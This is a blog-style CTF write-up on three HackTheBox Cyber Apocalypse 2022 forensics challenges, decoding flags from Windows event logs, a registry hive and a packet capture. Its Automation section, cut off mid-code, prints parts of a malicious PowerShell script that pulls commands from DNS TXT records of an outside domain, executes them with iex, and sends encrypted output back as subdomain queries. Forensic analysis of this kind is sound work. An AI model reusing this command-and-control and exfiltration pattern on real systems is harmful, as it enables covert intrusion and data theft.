{"title":"CyberApocalypseCTF2022 - Forensics","uid":"e654344e9b34dd2b6c6880eb70864ae0","slug":"CyberApocalypseCTF2022-Forensics","date":"2022-06-09T12:22:47.000Z","updated":"2022-06-09T13:10:25.490Z","comments":true,"path":"api/articles/CyberApocalypseCTF2022-Forensics.json","keywords":"security, ctf, redteam, programming, hacking, python, golang, linux, windows, hackthebox, ctftime","cover":"/post/CyberApocalypseCTF2022-Forensics/cover.png","content":"<p>Challenges solved in the field of forensics in the Cyber Apocalypse CTF 2022 competition.</p>\n<ul>\n<li>Puppeteer</li>\n<li>Golden Persistence</li>\n<li>Automation</li>\n</ul>\n<h2 id=\"Puppeteer\"><a href=\"#Puppeteer\" class=\"headerlink\" title=\"Puppeteer\"></a>Puppeteer</h2><p>The participant is provided with a set of logs for the Windows operating system, which they need to analyze in order to obtain the flag.</p>\n<p>Files with the “evtx” extension can be edited using the Event Viewer tool in Windows.</p>\n<p>PowerShell script event logs are stored in “Microsoft-Windows-PowerShell Operational.evtx”.</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/puppeteer-1.png\" alt=\"Puppeteer\"></p>\n<p>In one of the reports, I came across a script that stored some interesting values in the variables:</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/puppeteer-2.png\" alt=\"Puppeteer\"></p>\n<p>There was an interesting comment in the script<br>It says “Unpack Special Orders!” I assumed that a significant amount was stored in the $stage3 variable.</p>\n<p>In the first step, I removed the additional code related to “Unpack Shellcode”<br>In the next step, I concluded that the $stage3 variable stores an array of ascii code that can be converted to a string using “[System.Text.Encoding] :: ASCII.GetString”.</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token namespace\">[byte[]]</span> <span class=\"token variable\">$stage1</span> = 0x99<span class=\"token punctuation\">,</span> 0x85<span class=\"token punctuation\">,</span> 0x93<span class=\"token punctuation\">,</span> 0xaa<span class=\"token punctuation\">,</span> 0xb3<span class=\"token punctuation\">,</span> 0xe2<span class=\"token punctuation\">,</span> 0xa6<span class=\"token punctuation\">,</span> 0xb9<span class=\"token punctuation\">,</span> 0xe5<span class=\"token punctuation\">,</span> 0xa3<span class=\"token punctuation\">,</span> 0xe2<span class=\"token punctuation\">,</span> 0x8e<span class=\"token punctuation\">,</span> 0xe1<span class=\"token punctuation\">,</span> 0xb7<span class=\"token punctuation\">,</span> 0x8e<span class=\"token punctuation\">,</span> 0xa5<span class=\"token punctuation\">,</span> 0xb9<span class=\"token punctuation\">,</span> 0xe2<span class=\"token punctuation\">,</span> 0x8e<span class=\"token punctuation\">,</span> 0xb3<span class=\"token punctuation\">;</span>\n<span class=\"token namespace\">[byte[]]</span> <span class=\"token variable\">$stage2</span> = 0xac<span class=\"token punctuation\">,</span> 0xff<span class=\"token punctuation\">,</span> 0xff<span class=\"token punctuation\">,</span> 0xff<span class=\"token punctuation\">,</span> 0xe2<span class=\"token punctuation\">,</span> 0xb2<span class=\"token punctuation\">,</span> 0xe0<span class=\"token punctuation\">,</span> 0xa5<span class=\"token punctuation\">,</span> 0xa2<span class=\"token punctuation\">,</span> 0xa4<span class=\"token punctuation\">,</span> 0xbb<span class=\"token punctuation\">,</span> 0x8e<span class=\"token punctuation\">,</span> 0xb7<span class=\"token punctuation\">,</span> 0xe1<span class=\"token punctuation\">,</span> 0x8e<span class=\"token punctuation\">,</span> 0xe4<span class=\"token punctuation\">,</span> 0xa5<span class=\"token punctuation\">,</span> 0xe1<span class=\"token punctuation\">,</span> 0xe1<span class=\"token punctuation\">;</span>\n\n<span class=\"token namespace\">[array]</span>::Reverse<span class=\"token punctuation\">(</span><span class=\"token variable\">$stage2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$stage3</span> = <span class=\"token variable\">$stage1</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$stage2</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">#Unpack Special Orders!</span>\n\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span>=0<span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span> <span class=\"token operator\">-lt</span> <span class=\"token variable\">$stage3</span><span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$stage3</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> = <span class=\"token variable\">$stage3</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-bxor</span> 0xd1<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token namespace\">[System.Text.Encoding]</span>::ASCII<span class=\"token punctuation\">.</span>GetString<span class=\"token punctuation\">(</span><span class=\"token variable\">$stage3</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#HTB&#123;b3wh4r3_0f_th3_b00t5_0f_just1c3...&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Golden-Persistence\"><a href=\"#Golden-Persistence\" class=\"headerlink\" title=\"Golden Persistence\"></a>Golden Persistence</h2><p>There is a file called “NTUSER.DAT” in this challenge, which indicates that it is an “MS Windows registry file”</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>$ file .&#x2F;NTUSER.DAT</p></blockquote>\n<p>NTUSER.DAT: MS Windows registry file, NT&#x2F;2000 or above</p>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">TIP</p>\n<p>Microsoft Windows NT 4 (and later) uses the Windows NT Registry File (REGF) to store system and application related data, e.g. configurations, most recently used (MRU) files.</p>\n</div>\n<p>Using a tool called “accessdata registry viewer”, I checked and edited this file.</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/goldenpersistence-1.png\" alt=\"Puppeteer\"></p>\n<p>There were no results from my reviews,<br>The tool allows the user to export all the information in text form, which I used to check all the text:</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/goldenpersistence-2.png\" alt=\"Puppeteer\"></p>\n<p>After checking the output file, I realized this part<br>A PowerShell script appears to be running as base64:</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/goldenpersistence-3.png\" alt=\"Puppeteer\"></p>\n<p>First I saved the encoded script in a variable in PowerShell</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/goldenpersistence-4.png\" alt=\"Puppeteer\"></p>\n<p>Then I decoded it with the command “[System.Text.Encoding] :: ASCII.GetString ([System.Convert] :: FromBase64String ($ script))”</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/goldenpersistence-5.png\" alt=\"Puppeteer\"></p>\n<p>Examining the script, I noticed that the program decrypts the values by taking values from the register using the key in the code.</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/goldenpersistence-6.png\" alt=\"Puppeteer\"></p>\n<p>I collected the values according to each of the paths in the code, for example the value of the first path is like this</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>$encrypted1 &#x3D; (Get-ItemProperty -Path HKCU:\\SOFTWARE\\ZYb78P4s).t3RBka5tL</p></blockquote>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/goldenpersistence-7.png\" alt=\"Puppeteer\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">key: HKCU:\\SOFTWARE\\ZYb78P4s\\t3RBka5tL\n\nvalue :F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>After collecting all the values of the final code is as follows</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token variable\">$enc</span> = <span class=\"token namespace\">[System.Text.Encoding]</span>::ASCII\n\n<span class=\"token keyword\">function</span> encr <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">param</span><span class=\"token punctuation\">(</span>\n        <span class=\"token namespace\">[Byte[]]</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span>\n        <span class=\"token namespace\">[Byte[]]</span><span class=\"token variable\">$key</span>\n      <span class=\"token punctuation\">)</span>\n\n    <span class=\"token namespace\">[Byte[]]</span><span class=\"token variable\">$buffer</span> = <span class=\"token function\">New-Object</span> Byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">.</span>Length\n    <span class=\"token variable\">$data</span><span class=\"token punctuation\">.</span>CopyTo<span class=\"token punctuation\">(</span><span class=\"token variable\">$buffer</span><span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">)</span>\n\n    <span class=\"token namespace\">[Byte[]]</span><span class=\"token variable\">$s</span> = <span class=\"token function\">New-Object</span> Byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> 256<span class=\"token punctuation\">;</span>\n    <span class=\"token namespace\">[Byte[]]</span><span class=\"token variable\">$k</span> = <span class=\"token function\">New-Object</span> Byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> 256<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> = 0<span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-lt</span> 256<span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> = <span class=\"token namespace\">[Byte]</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$k</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> = <span class=\"token variable\">$key</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span> <span class=\"token operator\">%</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token variable\">$j</span> = 0<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> = 0<span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-lt</span> 256<span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$j</span> = <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$k</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> 256<span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$temp</span> = <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> = <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span> = <span class=\"token variable\">$temp</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token variable\">$i</span> = <span class=\"token variable\">$j</span> = 0<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span> = 0<span class=\"token punctuation\">;</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">-lt</span> <span class=\"token variable\">$buffer</span><span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">;</span> <span class=\"token variable\">$x</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$i</span> = <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">+</span> 1<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> 256<span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$j</span> = <span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> 256<span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$temp</span> = <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> = <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span> = <span class=\"token variable\">$temp</span><span class=\"token punctuation\">;</span>\n        <span class=\"token namespace\">[int]</span><span class=\"token variable\">$t</span> = <span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> 256<span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$buffer</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">]</span> = <span class=\"token variable\">$buffer</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-bxor</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$buffer</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">function</span> HexToBin <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">param</span><span class=\"token punctuation\">(</span>\n    <span class=\"token namespace\">[Parameter(\n        Position=0,\n        Mandatory=$true,\n        ValueFromPipeline=$true)\n    ]</span>\n    <span class=\"token namespace\">[string]</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span>\n    <span class=\"token variable\">$return</span> = @<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> = 0<span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-lt</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">.</span>Length <span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">+=</span> 2<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$return</span> <span class=\"token operator\">+=</span> <span class=\"token namespace\">[Byte]</span>::Parse<span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">.</span>Substring<span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">,</span> 2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token namespace\">[System.Globalization.NumberStyles]</span>::HexNumber<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">Write-Output</span> <span class=\"token variable\">$return</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token namespace\">[Byte[]]</span><span class=\"token variable\">$key</span> = <span class=\"token variable\">$enc</span><span class=\"token punctuation\">.</span>GetBytes<span class=\"token punctuation\">(</span><span class=\"token string\">\"Q0mmpr4B5rvZi3pS\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$encrypted1</span> = <span class=\"token string\">\"F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39\"</span>\n<span class=\"token variable\">$encrypted2</span> = <span class=\"token string\">\"CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1\"</span>\n<span class=\"token variable\">$encrypted3</span> = <span class=\"token string\">\"C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D\"</span>\n<span class=\"token variable\">$encrypted4</span> = <span class=\"token string\">\"D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1\"</span>\n<span class=\"token variable\">$encrypted5</span> = <span class=\"token string\">\"84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB\"</span>\n<span class=\"token variable\">$encrypted</span> = <span class=\"token string\">\"<span class=\"token function\">$<span class=\"token punctuation\">(</span><span class=\"token variable\">$encrypted1</span><span class=\"token punctuation\">)</span></span><span class=\"token function\">$<span class=\"token punctuation\">(</span><span class=\"token variable\">$encrypted2</span><span class=\"token punctuation\">)</span></span><span class=\"token function\">$<span class=\"token punctuation\">(</span><span class=\"token variable\">$encrypted3</span><span class=\"token punctuation\">)</span></span><span class=\"token function\">$<span class=\"token punctuation\">(</span><span class=\"token variable\">$encrypted4</span><span class=\"token punctuation\">)</span></span><span class=\"token function\">$<span class=\"token punctuation\">(</span><span class=\"token variable\">$encrypted5</span><span class=\"token punctuation\">)</span></span>\"</span>\n\n<span class=\"token namespace\">[Byte[]]</span><span class=\"token variable\">$data</span> = HexToBin <span class=\"token variable\">$encrypted</span>\n<span class=\"token variable\">$DecryptedBytes</span> = encr <span class=\"token variable\">$data</span> <span class=\"token variable\">$key</span>\n<span class=\"token variable\">$DecryptedString</span> = <span class=\"token variable\">$enc</span><span class=\"token punctuation\">.</span>GetString<span class=\"token punctuation\">(</span><span class=\"token variable\">$DecryptedBytes</span><span class=\"token punctuation\">)</span>\n<span class=\"token variable\">$DecryptedString</span>\n\n<span class=\"token comment\">#HTB&#123;g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Automation\"><a href=\"#Automation\" class=\"headerlink\" title=\"Automation\"></a>Automation</h2><p>In this challenge, a file captured with wireshark is given that you should check.</p>\n<p>First, I filtered the packets according to the http protocol</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/automation-1.png\" alt=\"Puppeteer\"></p>\n<p>I noticed that an image was downloaded but when I dumped the image I noticed that it was an encoded string with base64</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/automation-2.png\" alt=\"Puppeteer\"></p>\n<p>If we decode the string with base64, we get a PowerShell script</p>\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/automation-3.png\" alt=\"Puppeteer\"></p>\n<p>After checking the code, I found out that she received a series of commands using the dns query from the “windowsliveupdater.com” domain</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token variable\">$out</span> = <span class=\"token function\">Resolve-DnsName</span> <span class=\"token operator\">-</span><span class=\"token function\">type</span> TXT <span class=\"token operator\">-</span>DnsOnly windowsliveupdater<span class=\"token punctuation\">.</span>com <span class=\"token operator\">-</span>Server 147<span class=\"token punctuation\">.</span>182<span class=\"token punctuation\">.</span>172<span class=\"token punctuation\">.</span>189<span class=\"token punctuation\">|</span><span class=\"token function\">Select-Object</span> <span class=\"token operator\">-</span>Property Strings<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>The received information had several sections that were decrypted with a key in the script</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token variable\">$encryptedString</span> = <span class=\"token variable\">$out</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>Strings<span class=\"token punctuation\">[</span>0<span class=\"token punctuation\">]</span>\n<span class=\"token variable\">$backToPlainText</span> = Decrypt-String <span class=\"token variable\">$key</span> <span class=\"token variable\">$encryptedString</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>After decrypted, execute the received command and save the output in encrypted form in output variable.</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token variable\">$output</span> = <span class=\"token function\">iex</span> <span class=\"token variable\">$backToPlainText</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$pr</span> = Encrypt-String <span class=\"token variable\">$key</span> <span class=\"token variable\">$output</span><span class=\"token punctuation\">|</span>parts 32<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>Commands are divided into 32 sections. And queries each section as a subdomain</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ans</span> = 0<span class=\"token punctuation\">;</span> <span class=\"token variable\">$ans</span> <span class=\"token operator\">-lt</span> <span class=\"token variable\">$pr</span><span class=\"token punctuation\">.</span>length-1<span class=\"token 